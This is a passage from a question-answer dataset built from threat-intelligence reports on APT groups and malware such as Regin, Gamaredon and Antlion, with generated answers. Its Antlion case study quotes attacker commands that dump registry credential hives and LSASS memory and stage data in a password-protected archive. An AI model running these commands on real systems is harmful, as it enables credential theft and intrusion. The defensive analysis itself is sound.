gap in activity, it is possible that campaigns involving Dripion happened during this period and went undetected due to its small target window.\nAnother interesting tactic used to deceive potential targets lies within the C&C infrastructure. The attackers created multiple domains with names similar to that of legitimate companies and websites in the antivirus community. For example the domains hyydn.nortonsoft[.]com and mhysix.mcfeesoft[.]com were both C&C domains used in attacks. Using typo-squat domains to mimic legitimate sites is a tactic frequently used to trick the targets as well as defenders, in an effort to make the domains blend in with normal activity.\nBig Headline: Conclusion\nWe began this investigation with what we believed was a new campaign using an unidentified back door Trojan against targets primarily in Taiwan. As the investigation grew we found multiple ties between this newly discovered attack and activity associated with the Budminer cyberespionage group:\nSame unique downloader (not publicly available and only seen used in China-based cyberespionage activity)\nThe unique downloader used by both Dripion and Taidoor encrypts data using the victim's MAC address as the RC4 key\nUse of the same blogs for distribution of malware (Taidoor and Dripion)\nUse of shared C&C infrastructure (at the root domain level)\nSimilar targeting (primary location of targets is Taiwan)\nWe compared Dripion against Taidoor malware samples to determine if there was any shared code or if it may have originated from the same developer. Our findings concluded there were no similarities between the two malware families. However, the downloader used by both malware families has unique attributes, and we believe it to be from the same developer.\nSo what does all this mean? Attribution of cyberespionage groups is difficult and needs to be done carefully based on fact and not assumptions. We have a number of ties between the two sets of activity. Not all of the ties are strong on their own, but together provide a strong case that there is a relationship between the groups targeting Taiwan using Dripion and Taidoor malware.\nBased on the evidence we have presented Symantec attributed the activity involving the Dripion malware to the Budminer advanced threat group. While we have not seen new campaigns using Taidoor malware since 2014, we believe the Budminer group has changed tactics to avoid detection after being outed publicly in security white papers and blogs over the past few years.\nThis investigation is just one example of Symantec's ongoing effort to identify unknown emerging threats. By remaining one step ahead of adversaries, we can protect customers with intelligence driven security.\nBig Headline: Mitigation advice\nAlways keep your security software up to date to protect yourself against any new variants of this malware.\nKeep your operating system and other software updated. Software updates will frequently include patches for newly discovered security vulnerabilities which are frequently exploited by attackers.\nDelete any suspicious-looking emails you receive, especially if they contain links or attachments. Spear phishing emails are frequently used by cyberespionage attackers as a means of luring victims into opening malicious files.\n\nQuestion: How did the developers of the Dripion malware employ encryption techniques to make detection more difficult, and what does this indicate about their capabilities?\n\nAnswer:",
    "output": "The developers of the Dripion malware used XOR encoding for both the binary configuration file (XOR: 0xA8) and network requests with the C&C server (XOR: 0xA3) to make detection more difficult. This indicates that the attackers have the capability to create and develop their own custom malware, as well as update their code to provide new capabilities and evade detection. The presence of version numbers hardcoded within the malware further supports this indication of sophisticated development practices.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nGamaredon has been targeting Ukrainian victims for almost a decade. As international tensions surrounding Ukraine remain unresolved, Gamaredon's operations are likely to continue to focus on Russian interests in the region. This blog serves to highlight the importance of research into adversary infrastructure and malware, as well as community collaboration, in order to detect and defend against nation-state cyberthreats. While we have mapped out three large clusters of currently active Gamaredon infrastructure, we believe there is more that remains undiscovered. Unit 42 remains vigilant in monitoring the evolving situation in Ukraine and continues to actively hunt for indicators to put protections in place to defend our customers anywhere in the world. We encourage all organizations to leverage this research to hunt for and defend against this threat.\nMedium Headline: Protections and Mitigations\nThe best defense against this evolving threat group is a security posture that favors prevention. We recommend that organizations implement the following:\nSearch network and endpoint logs for any evidence of the indicators of compromise associated with this threat group.\nEnsure cybersecurity solutions are effectively blocking against the active infrastructure IoCs identified above.\nImplement a DNS security solution in order to detect and mitigate DNS requests for known C2 infrastructure.\nApply additional scrutiny to all network traffic communicating with AS 197695 (Reg[.]ru).\nIf you think you may have been compromised or have an urgent matter, get in touch with the (<http://start.paloaltonetworks.com/contact-unit42.html>)Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign:\nprotects endpoints from the malware techniques described in this blog.\ncloud-based threat analysis service accurately identifies the malware described in this blog as malicious.\nUsers of  contextual threat intelligence service can view malware associated with these attacks using the (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.GamaredonGroup>)Gamaredon Group tag.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the (<http://www.cyberthreatalliance.org/>)Cyber Threat Alliance.\n\nHow can organizations effectively defend against the evolving threat posed by the Gamaredon group? Explain the key strategies and technologies recommended.",
    "output": "A: Organizations can effectively defend against the evolving threat posed by the Gamaredon group by implementing a multi-layered security posture that favors prevention. Key strategies and technologies recommended include searching network and endpoint logs for any evidence of the indicators of compromise associated with this threat group. Ensuring cybersecurity solutions are effectively blocking against the active infrastructure IoCs identified is crucial. Implementing a DNS security solution to detect and mitigate DNS requests for known command and control (C2) infrastructure is another important step. Additionally, applying additional scrutiny to all network traffic communicating with AS 197695 (Reg[.]ru) can help in identifying suspicious activities. For Palo Alto Networks customers, utilizing products like Cortex XDR to protect endpoints from the malware techniques described, WildFire cloud-based threat analysis service to accurately identify the malware, and AutoFocus contextual threat intelligence service to view malware associated with these attacks using the Gamaredon Group tag are effective measures. Sharing findings and indicators of compromise with fellow Cyber Threat Alliance members also helps in rapid deployment of protections and systematic disruption of malicious cyber actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key functionalities of the zwShell command and control (C&C) server in the context of the Night Dragon attacks, and how do these functionalities facilitate the monitoring and control of compromised systems?",
    "output": "The zwShell C&C server provides several key functionalities that facilitate the monitoring and control of compromised systems. These include the ability to create custom Trojans, launch the C&C server by specifying a port and password, configure server settings such as listening port, encryption password, sound notifications, and remote access color depth. Additionally, the attacker can specify the RAT DLL details, C&C hostnames or IP addresses, and dropper EXE process icon. Once a client connects, the attacker can establish full remote control, browse the file system, launch command-line shells, manipulate the registry, view the remote desktop, and uninstall the Trojan from the client. These functionalities enable the attacker to effectively manage and exfiltrate data from multiple compromised systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Stage 3 \u2013 32-bit \u2013 kernel mode manager \"VMEM.sys\"\nOn 32-bit systems, the third stage is implemented as a driver module and provides the basic functionality of the malicious framework. It is responsible for operating the encrypted virtual file system and loading additional plugins, and also provides several built-in plugins for the entire framework.\nThe module initializes the framework, sets up the plugin system and starts the actual work cycle of the malware. It also passes execution to the plugin id 50221 that is loaded from the VFS.\nBuilt-in plugins provided by this module are:\nMedium Headline: Stage 3 \u2013 64-bit\nOn 64-bit Windows systems, stage 3 is missing. Stage 2 loads the dispatcher directly from the disk and runs it.\nStage 4 (32-bit) / 3 (64-bit) \u2013 dispatcher module, 'disp.dll'\n32-bit\n64-bit\nThe dispatcher library is the user-mode core of the framework. It is loaded directly as the third stage of the 64-bit bootstrap process, or extracted and loaded from the VFS as module 50221 as the fourth stage on 32-bit systems.\nIt implements a set of internal plugins:\nThe dispatcher takes care of the most complicated tasks of the Regin platform, such as providing an API to access virtual file systems, basic communications and storage functions, as well as network transport subroutines. In essence, the dispatcher is the brain that runs the entire platform.\nMedium Headline: Stage 4 \u2013 Virtual File Systems (32/64-bit)\nThe most interesting code from the Regin platform is stored in encrypted file storages, known as Virtual File Systems (VFSes).\nDuring our analysis we were able to obtain 24 VFSes from multiple victims around the world. Generally, these have random names and can be located in several places in the infected system:\nEach VFS has a structure that is very similar to a real disk file system such as FAT. The VFS files start with a header that provides basic information required to operate the file system. The header is followed by the bitmap of used/ free sectors and then by the file table.\nFiles are described by file table entries:\nEach sector starts with a 32-bit integer that is the offset of the next sector of the file.\nAn example:\n\u2022 File record at offset 0x122, file ID 50221, offset of the first sector 0x7B13\n\u2022 Sector at 0x7B13, next sector at 0x7D13\n\u2022 Sector at 0x7D13, next sector at 0x7F13,\n\u2022 Sector at 0x7F13, next sector at 0x8113, etc.\nExample of Regin VFS parsing\nAlthough the structures of the file system are unencrypted, the file entries are encrypted. The encryption algorithm used is RC5, and many records are also compressed using the nrv2e algorithm from the UCL library. UCL is an open source implementation of the proprietary NRV ('Not Really Vanished') compression algorithm, and was originally used by the UPX tool. The reason why the attackers chose UCL is simple: it's small, compact and requires little to no additional memory for decompression.\nEach VFS we encountered was encrypted with a 16 bytes key, which can vary from victim to victim. Based on our experience, most files were however encrypted with the same key, {73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01} stored in the dispatcher module or VMEM.sys kernel core.\nVFS RC5 decryption key inside the dispatcher module (disp.dll)\nIn all, we observed about a dozen different VFS keys.\nThe following plugins were observed inside the VFSes we collected. These are all identified by a 16-bit number. The plugins are referenced by these numbers; they are like filenames on a normal file system and allow the dispatcher to easily load or reference them.\nThe binary modules are referenced by these numbers as plugin identifiers and usually have similar internal DLL names; e.g., the plugin with ID '50121' will have the internal name '50121.dll' in its export table. Compressed binary modules are accompanied by binary files with the same ID. These files contain the size of the decompressed module and are not included in the description.\nKnown data blocks and their configuration IDs:\nKnown executable modules and their plugin IDs:\nThe attackers can dynamically add and delete plugins inside the VFS and each victim installation has a different set of plugins depending on the type of activity the attackers need to execute. For example, only some of the VFSes we have seen had lateral movement modules, designed for infecting other computers in the network.\n\nQ: How does the Regin malware handle the transition between stages on 32-bit and 64-bit systems, and what role does the dispatcher module play in this process?",
    "output": "A: On 32-bit systems, the third stage of the Regin malware is implemented as a driver module called 'VMEM.sys', which initializes the framework, sets up the plugin system, and starts the work cycle of the malware. It then passes execution to the plugin with ID 50221, which is loaded from the Virtual File System (VFS). On 64-bit systems, the third stage is missing; instead, stage 2 directly loads the dispatcher module from the disk and runs it. The dispatcher module, 'disp.dll', acts as the user-mode core of the framework. It is responsible for the most complicated tasks, including providing an API to access virtual file systems, handling basic communications and storage functions, and managing network transport subroutines. Essentially, the dispatcher is the brain that runs the entire Regin platform.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nOur investigation begins by taking a look at the following file: ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9. According to the analysis published on malwr.com[3], this file was originally named 'Israel Homeland Defense Directory 2015 _Secured_.exe' and, once executed, the following decoy document was presented:\nThe initial file in this case is a self\u00adextracting RAR file that contains three components, including a decoy document (in this case, the PDF shown above) and the malware.\nFurther inspection of the malware extracted showed it wasn't a family our analysts recognised. This, coupled with the nature of the decoy document used, led us to take a more in depth look at the malware, and associated infrastructure.\nWe'd like to give special thanks to Eyal Sela of ClearSky Security for his collaborative efforts in this research.\n\nQ: Why did the analysts decide to conduct an in-depth investigation into the malware found in the file 'Israel Homeland Defense Directory 2015 _Secured_.exe', and what specific characteristics of the malware and its delivery mechanism prompted this decision?",
    "output": "A: The analysts decided to conduct an in-depth investigation into the malware because the malware extracted from the file 'Israel Homeland Defense Directory 2015 _Secured_.exe' was not recognized as belonging to any known malware family. Additionally, the use of a decoy document, specifically a PDF, within a self-extracting RAR file that contained three components, further raised suspicions. These factors, combined with the nature of the decoy document, indicated a potentially sophisticated and targeted attack, warranting a deeper analysis of both the malware and its associated infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Technical details\nAs well as the attack on the financial institution outlined in the case study below, Antlion compromised the networks of at least two other organizations in Taiwan, including another financial organization and a manufacturing company. The activity the group carried out on those networks was largely similar to the activity that is detailed in the case study, with the xPack backdoor frequently deployed and a lot of evidence of credential dumping. In the manufacturing target, also, we see the attackers attempting to download malicious files via SMB shares.\nThe attackers also spent a significant amount of time on both these targeted networks, spending close to 250 days on the financial organization and around 175 days on the manufacturing organization.\nSymantec, a division of Broadcom, cannot state with certainty what the initial infection vector used by the attackers in this campaign was, though in one instance they were seen utilizing the MSSQL service to execute system commands, which indicates that the most likely infection vector was exploitation of a web application or service. However, Antlion are also known to have previously used malicious emails to gain initial access to victim networks.\nThe main custom backdoor used by Antlion in this campaign was the xPack backdoor, which is a custom .NET loader that decrypts (AES), loads, and executes accompanying .bin files. Its decryption password is provided as a command-line argument (Base64 encoded string), and xPack is intended to be run as a standalone application or as a service (xPackSvc variant). The xPack malware and its associated payload seems to be used for initial access; it appears that xPack was predominantly used to execute system commands, drop subsequent malware and tools, and stage data for exfiltration. The attackers also used a custom keylogger and three custom loaders.\nEHAGBPSL loader - custom loader written in C++ - loaded by JpgRun loader\nJpgRun loader - customer loader written in C++ - similar to xPack, reads the decryption key and filename from the command line - decodes the file and executes it\nCheckID - custom loader written in C++ - based on loader used by BlackHole RAT\nThe attackers also used a custom SMB session enumeration tool (NetSessionEnum), a custom bind/reverse file transfer tool named ENCODE MMC, and a Kerberos golden ticket tool based on Mimikatz.\nThe attackers also used a variety of off-the-shelf tools, as well as leveraging living-off-the-land tools such as PowerShell, WMIC, ProcDump, LSASS, and PsExec. The legitimate AnyDesk tool was also abused by the attackers for remote access in one of the victim organizations. The attackers were also observed leveraging exploits such as CVE-2019-1458 for privilege escalation and remote scheduled tasks to execute their backdoor. CVE-2019-1458 is an elevation-of-privilege vulnerability that occurs in Windows when the Win32k component fails to properly handle objects in memory.\nLegitimate versions of WinRAR appear to have been exploited by the attackers for data exfiltration, while there is also evidence of data exfiltration via PowerShell, specifically using the BitsTransfer module to initiate an upload to attacker-controlled infrastructure. There is also evidence that the attackers likely automated the data collection process via batch scripts, while there is also evidence of instances\nwhere data was likely staged for further exfiltration, though it was not actually observed being exfiltrated from the network. In these instances, it appears the attackers were interested in collecting information from software pertaining to business contacts, investments, and smart card readers.\nBig Headline: Case study: Attack on a financial organization\nThe attackers spent a significant amount of time on victims' networks, and deployed both custom and off-the-shelf malware. In one financial sector victim in Taiwan the attackers spent almost nine months on the victim network.\nThe first suspicious activity on this victim network occurred in December 2020 when WMIC was used to execute two commands:\nwmic process get CSName,Description,ExecutablePath,ProcessId /format:\";CSIDL_SYSTEM\\wbem\\zh-tw\\htable.xsl\";\nwmic os get\nname,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:\";CSIDL_SYSTEM\\wbem\\zh-tw\\htable.xsl\";\nThe first command was used to list the computer name, description of processes, executable path, and process ID. The output was written to a suspicious file named htable.xsl under the wbem directory. The second command was used to collect information about the system, which was written out to the same file (htable.xsl). Information collected included:\nVersion of the operating system (OS)\nThe installation date\nThe last time the system was booted\nThe local date and time of the system\nThe manufacturer\nThe registered user\nService pack information - this can be used to determine what patches are installed\nSystem directory path\nFive minutes after those commands were issued, WMIC was used to dump credentials:\nreg save HKLM\\SAM CSIDL_COMMON_DOCUMENTS\\sam.hiv\nreg save HKLM\\SYSTEM CSIDL_COMMON_DOCUMENTS\\sys.hiv\nreg save hklm\\security CSIDL_COMMON_DOCUMENTS\\security.hiv\nThe commands listed above were all executed via Antlion's custom xPack backdoor.\nSeveral days later, during the Christmas holiday period, the attackers returned over a period of a few days and executed the xPack backdoor again. They also executed an unknown VBS script via PsExec multiple times:\n\";cscript.exe\"; CSIDL_SYSTEM_DRIVE\\update.vbs\nOn December 28, the attackers used xPack to launch a command prompt to dump credentials from several machines within the compromised organization with the following commands:\nupload.exe -accepteula -ma lsass.exe 16.dmp (a renamed version of Sysinternals procdump64.exe)\nreg save hklm\\sam CSIDL_PROFILE\\publicsam.hive\nreg save hklm\\system CSIDL_PROFILE\\public\\system.hive\nreg save hklm\\security CSIDL_PROFILE\\public\\security.hive\nOver the following couple of weeks, the attackers continued to return intermittently to launch the xPack backdoor or to dump credentials via the registry. Then, following a few weeks of inactivity, they become active on the infected network once again.\nThe attackers used the xPack backdoor to launch a command prompt to execute the following commands:\n\";cmd\"; /K CHCP 950\nCHCP 950\nquery user\n\";CSIDL_SYSTEM\\quser.exe\";\ntasklist /v\nfindstr explorer\ncmd /c dir \";CSIDL_PROFILE\\desktop\";\nCSIDL_SYSTEM\\cmd.exe /c cmd /c dir \\users /b\ncmd /c dir \";CSIDL_PROFILE\\desktop\";\ncmd /c dir \\users /b\nreg save hklm\\security CSIDL_COMMON_DOCUMENTS\\security.hiv\nrar a -r -hp1qaz@WSX3edc!@# W22-009-099.tmp \";CSIDL_COMMON_DOCUMENTS\\w22-009-099_file\";\nreg save hklm\\system CSIDL_COMMON_DOCUMENTS\\system.hiv\nreg save hklm\\sam CSIDL_COMMON_DOCUMENTS\\sam.hiv\nThe above commands were used to firstly change the code page to 950, which is the Windows code page for Traditional Chinese. The attackers then executed 'query user' to list any logged-in users on the system, as well as running 'tasklist' to get a list of all the running processes on the system. They also tried to discover what processes were running, before listing all contents of the Desktop directory and the Users directory. After this, the attackers dumped credentials again via the registry.\nThe attackers returned to the network a couple of weeks later and carried out largely the same activity. The attackers remained active on the network for March, April, and May 2021, intermittently returning to launch their xPack backdoor or dump credentials from the registry. Dumping credentials appears to be a main focus of the attackers, with them likely using these credentials to move laterally across the network to identify machines of interest from which they can exfiltrate data.\nThe last activity on this network, after a gap of three months, occurred in August 2021, when the attackers returned and listed all available shares. They then dumped credentials from the registry and proceeded to collect account, group, and workstation configuration information.\nThey then dumped credentials from the registry once again. This was the last activity seen on this network.\nBig Headline: Experienced actor stays active\nAntlion is believed to have been involved in espionage activities since at least 2011, and this recent activity shows that it is still an actor to be aware of more than 10 years after it first appeared.\nThe length of time that Antlion was able to spend on victim networks is notable, with the group able to spend several months on victim networks, affording plenty of time to seek out and exfiltrate potentially sensitive information from infected organizations. The targeting of Taiwan is perhaps unsurprising given we know Chinese state-backed groups tend to be interested in organizations in that region.\n\nWhat methods and tools did Antlion use for initial access and lateral movement within the compromised networks? Explain how these techniques contributed to their persistence and data exfiltration efforts.",
    "output": "Antlion employed several methods for initial access, including the exploitation of a web application or service via the MSSQL service to execute system commands. Additionally, they are known to have used malicious emails in previous campaigns. For lateral movement, the group utilized credential dumping techniques, such as saving registry hives (SAM, SYSTEM, SECURITY) and using tools like ProcDump to extract LSASS memory dumps. They also leveraged living-off-the-land tools like PowerShell, WMIC, and PsExec, along with custom tools like a Kerberos golden ticket tool based on Mimikatz. These techniques allowed Antlion to maintain persistence, move laterally within the network, and ultimately exfiltrate sensitive data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the ClientX backdoor ensure that only one instance of itself runs at a time? What potential issues might arise if this mechanism fails?",
    "output": "The ClientX backdoor ensures that only one instance of itself runs by creating a Mutex called 'clientX'. If another instance of the malware is detected, it terminates the new instance. This mechanism prevents multiple instances from running simultaneously, which could lead to conflicts, increased system resource usage, and potentially expose the malware to detection due to abnormal behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Samples using bundled commodity tools:\n026be8a873560f1496c6961f6e36c312bdda01beacb17c4b744f35ee1923d061 03c943f5cba11b09b9c3afa0705d4a027e5a9d81b299711740cc5aedfe4b4aa1 03e5e99cc8280de4663c4b65bfd26782d4975258808a63a4b20bc068008df7f5 059e40ba91b2b2d827c200476fcbd0fad0d43ab198d0c206c996777d27e6de65 0669e61e51cf43daa431d52b5461c90bdce1b1bee03b087e4406c30264dcb9a4 068b9a9194efacc16cf142814e79b7041b6ab3d671a95bb508dbd30061c324aa 0b4a90b823a581311c4acb59f35e32f81f70ca16a2538f54f4dbe03db93350df 0b5316d723d1ebbec9aba0c9ff6761050305d644c3eeb5291b4e2c4de9e5fa15 0b8d59312699739b6e6cb7aeb0f22a2eaebbb0fd898a97ef9b83e8d8e9ce67a0 0dd13d2d0edbcf9d1825c2bfc165876ada2e4d04e2981a0003cb6503fad2287b 0ddb7867e31f3f30cd1cfe74393f8ac5bbdc61538278de9219a49345f0d3af7f 13fed3accac4f38f28e606b110a3b7924d9c7a1a911f8c0613d0bb791e715267 151cf4c83722ba171ae42640e5e13af67ca06ee0a06a74afa53931acf6ac1506 17006d77cc1459aa3d70e4e9377edb2547a7446647aa9872c9dd9ad860ed7e39 1ec7e595677038145991c6d84dc7808602142f258c1f90e9486cca0fe531d74f 208dc592111a8221a9c633efc120b890585f9a67ed340cbb5ec9db4cd5e164e4 2124adbee89f2c1cb65896bed26e7ffa8bf0fcbdfeb99a9e751fea9cca7a896b 22e97292671ada8deef4329eb115c52f6f1bc598bcf01a3961f1c35a2230a013 259a78122ef51ae503059143bf36941fc6090be83213d196ba3051ba36a0b2a1 26564c23530dd14e0042e074f4178a5b2ad6fc8f51f10138fc39941a6303bff9 29453fa1772b6d7d33842d6abbe0cb55c4a4b66a00f43284c8724d7c16749a7d 2a072d9ce63a94d2530cf9f18a232c6a09f6c7bdff9dbe27faceef53604145ea 2c02d3d3fadd76f9d21f5c093459ddc0045c94f17679269eb7a2990a1a88cb42 2d55000bb5cb9e3e1f137810c2e1eb899f68c40e4a6f6307f226c7b8af208abd 2ded2f3b5b5b6155ce818893c67887cbfa8b539be6c983e314ccf2177552da20 2e89436b355550ceb361fac1b03b78b71eda11d25f26223ac5c8c34ed8972a05 32b0e6394b110860371da5541946a6dcc85358a3951eddc86fdaf5794527c150 33934fcfae5760316b3f40e013cbb03d8086f8c30f9a4ba9bed3f9486a530796 34d86602882e86f8aaaeb7513126c8579a4489f2be31c279188e2f2ca8a0e141 390162dae62a0347e35cf5dad093cfc2f7d4ded62fba9d2df7af6133feb41ee0 3ef8602579c6b145fbaafc8970b4c9a6e7bebd11eb5e37eecaa67b4572c6038b 420acd7e8598fe994b59bf5d30f89e1c11b36cbef464a4786694cf9eada8dd4c 42b4c39179f76ea9eb5835b55a3cf4d8dbb29d42ee0622ad2e89ca48d01e8988 42eed03907c9dfa0e566fbe5968cdb5a1b7b5e18521f7327185ed2208c6c29b4 46a39da996b01e26ddd71d51c9704de2aa641cd3443f6fe0e5c485f1cd9fa65d 47d929c69bfd8d8efb9c280eabec2f73d4bddf1c3c30120c3fb6334623469888 505ef8cbc1271ce32f0c473468d75a1aba5073c37b2e6b49293ddc9efcb4ac96 5230453eeb98c5a183129ed8b918b429e96020887302ba30941c408108a1ab84 5363220b532d7da378b338e839a501ae5c006cc03c8b2d3627c480d64deb1221 558f33d478091993e5b5921604f8c3873efc87f551fddf61612b5c64d5b610f6 55c76f4f93f9e155fbb6a28447f97c1ccda0081061dc3cb9973d42c1686964b7 56c8246819f7de5cba91001793831441d4ce998ccb8237cb96c9f52e88ea384b 59bddb5ccdc1c37c838c8a3d96a865a28c75b5807415fd931eaff0af931d1820 5ac627f8964d3b9cad69f21e3b8f27305f1f68f49e4f4fae2c73949a04b32692 5ccc76ae1cdf668ba7f89c6cbd0bad44f148cbee736320ead237262ba170ffba 5cd4401c1dae9b9ecd75c96ab29dc64ce40bef3acc6faf7c001ff98ebd3b3413 5cd72eaf555813f1ee187def594584f5cfc6a5e83086f35e281327b5210adffb 5f8293eda9fb40684caddf576eba6c81f3a06911ca9e4ecf84ede3b2891cff5e 6c258151c593268c13c252d8f275192a6f7a74d5de5754f2cf20fb94be7ee6ea 0458e168baa4fa5942892065925ac82b12245551b539d54c2884b3a21c2699d8 877f1de209eb9d8b2a20a76f8773d12e5a1fcde4148868c7b73added392f62f6 29c728a169c5d18298e77db161dd5d2f6396ceca9ee7849b63ff8a8bc11f911e 98e092b7bfc3bbdaeb82e05de14ba5835c6ac626c17de9eef2049796a031dd10 27e08fb90ada2fd8ce6b6149786edd3b814dd0324257ebd919ed66ada0334b21 9f651ae6ea538238748614a7f86fe2b0f76e881d6c38da581f284e4b6f79b0ca f47115ea58615781e56dcac673c19edf7ce00defd7ada709ae97b0708d3eac1e b80719854f8744ba62e9f0e774c09e2e2ed79dd37f9f94ba3ed05ec8507d55e6 467f04914a1e6093bdaf5c28884bf95ec738234033b3292d289a0799de196d49 5c47d18b3f0e0274c6a66b2eab27d47c73a0105c263d41c6473aba9a28d0a4ba 01c5729ac1ae3928053c085fd616323a3715863ab3d7e9b8106c09e24df34183 5b6a691cf8faf238b27861941a1b667d889889cc9711a3e561403d6a6ed292c9 e2688f72cc7ae836be19e765e39318873554ee194a09945eb3f3805d04f256ca\n9f0228e3d1577ffb2533584c2b1d87ebee0c0d490f981e61d18bb27ab02e52cb 2617f9301869304b88d8a3a4f7b2eab6b0edf264cc1a28b99f5685959242ec39 f3107a5a00f36e12be7cc2e37c35903ef855b8043492af374ea918385821443c 63fcfab8e9b97d9aec3d6f243003ea3e2bf955523f08e6f1c0d1e28c839ee3d5 05cbe01b1125897e0e982c587a10a72f4df795b844a4a2c4cec44aee7f30ce94 5a7da102c11960b9651650143a4a08ae4ce97d68dff999961f1ffc792531afeb df6112e6bad4125b80b8829c13a2ca523bb82cf303cf531389d8795e7512c7e6 cfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31 e79dbcc8b60da280e53d9cf818eee1de34251e0551b9947bb2b79a31b131417e a73eac15797130c381b5b4a65c3fb1cfc723b1586a1882c981211787bba285a6 3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b f2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd ca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc 550ee89d5df17f90ba7689d957cd067dcdbe3d957c5369ea28d925e02ccc8ce6 f77d7940c51c2a1eab849dbd77e59c683ebf7820799ef349e7da2583e1aa11ae 2c5d55619d2f56dc5824a4845334e7804d6d306daac1c23bec6f078f30f1c825 7231177a115656041ba4e5b3cf0bf7a547b074f03592351484267e25cda7c899 d5405f99cec0166857274b6c02a7ef52b36274fedb805a17d2089fd24ed133cf 81921b6a7eba39a3f73895a57892ed3a46ab6365ac97d550ca3b9bff46c7a1c2 1eef9f8d7d3099b87be7ac25121f9d2ccacfb5ccf02b508fb2036b6e059c525f 5255061c3600df1a94b376fca40f3ccb69d1cb6dd42aa744b20a643c7292d20c b5199a302f053e5e9cb7e82cc1e502b5edbf04699c2839acb514592f2eeabb13 5fb7f6f953be3b65d88bd86d1391ebc9f88fc10b0ef23541463ebf5b157f695c 6016cf9898d74e2e9030be7c987964d817ba28ad2253d1da54c81a1bf49db836 621e55421dffae981e3e933c65626314d5610c7c08f76f83a3d07f0ec6c36e2d 6ccc24971073d24d90c4cbaf83dfbae2969cbf527e319c7ee9a4babcbe88e456 6f8da9180eebe02ba35317cb8aee5c8df6ac29795af70eb9430c3588d457aad6 71c5b899a5187baeb8f605ca39ca56bf05a63025a8f9f84c45590d8345e5d349 725b7d92ed66be160f2e04395008a65c72814d5ddf842d9778396f6c6679d85e 72d4b780a90ede7ea152f5da0973965cab31d2813fa8c2fe0e1cb611f5ca257e 73670d06851f588c7df44dc478f49883406697c48c618438e0f249b7a916552e 74e017853fbc85ee77ca7476cd25423815602aaaa02b29e0003c95c9551b8890 75d2367dc79d9f8aed165729df90ed5d28fefe267778dbe4d3d74aafa75d66e0 7a5a1c6ea0c2f017df9f06975c93a356cac20b19031fcde96136fa5881e5ef3a 7adb049e0b49312aea904c70e16d0e7f03d01aae4bf8ac867e8219ced4e6e057 7bfa85bec239b6c4419b2d57149c5960263c80e493f888d03ceaaa3f945b1b25 7f324b658f587b3b27921ebeba5ac25aebd669b33e6801fa9581de8c2eb0df2e 7fee970748eb83045e36911dafdaee0d4069ebe72c059cc7de3d65539012c2e9 823793a37d748ffe708864c16c853c67a5db812712481da1d24790b455163940 8512aabfa0175684bdbb77481d6b272b63dbc4249b04a44e1003b7d8fdea0a89 86c81f03cf7d8f8af38c2559dbf506cccdc25579f3b29fb574f823a67f99a0a3 88ae7e60b9dd57fc6b2d667ce33fb29c0f75d37eb7c837ccf56cb7994386d5ef 8b50e3ca06a22d0be6a71232b320137c776f80ac3f2c81b7440b43854b8a3bf0 8bd40e7fe6bbd4d5810db2c142186bb58da445a132fb6f9ff01c46947a532244 8c9d690e765c7656152ad980edd2200b81d2afceef882ed81287fe212249f845 8d38726d674279705fe06b4b45bbbaef10756c547d560cea6998e23dba09f80c 8db47439685edc683765abb5e6d7d0d05479bf9ee164992db9e8ce97fe43ee2f 95de2e16f1b05d1b45b1d182c1503568c2e5fd4a81ac52fe1bc9e881d1a272b1 95e3204228341852b7c97f357f799e7ec9688abe1262436b569e56397f1fd864 98caf00760d772598386eb8d4f26caf92fb891915ac08da6bf830be5e45278d3 99c9440a84cdc428ce140de901452eb334faec49f1f6258acdde1ddcbb34376e 9a8776e4ae38cf529bab28947b31ade84301262b7996dc37ec47afa4fb4cf6e1 9beb1d2a03ff2d4c15913de0f87b72074155b44df791bd967dac8155e97a0e06 9c8d518fbbc8cbb25fa309f5396efa5749e57a3b0158779404c8d3e92baf6596 a064a28e5e7409a96bba93fc57f44cadc3492bb0f49792c89c973e30b0f5d498 a194b47043356fa365d98a5f7c582b6f87fac90acf0f469ed3651cfe2fd7b2c9 a21dfb8e8b7c8dfbeeb4d72e6ef1f22c667b8968b3a3b1dcce99f44faab05903 a2e0fe2d385dabcdfb024100216d259ddd1fa9907e982d297846fd29b8d4d415 a48ad33695a44de887bba8f2f3174fd8fb01a46a19e3ec9078b0118647ccf599 a595da9a2fa58d4f8be0bfbcf7f4c950435ff5289dd1ccf2c65eec73a0afe97f a972ad0ddc00d5c04d9fe26f1748e12008efdd6524c9d2ea4e6c2d3e42d82b7b aa860d405746401ae4155485326fdeb39718832c77c73540d48f4fbb8e596215 ab6832a4432b4bdaec0706f7b00a369c48175eac9abc3e537032b1f5d26a993b ada2f0703614b3447d427827777af5d4ee9ffe9179498970326926751a4f8d65 b16d317c11228bd3573126a0e1bc0bbf35d84a4a1f47dfb06b70634a21fd9823 b3665548cc0f2fce3593fb7139f49588faa1d327b6d23feb564ca4194053ae8a b5578c48a11533871ae91e6d5632aafc25d3976c0626d62abab306663566d024 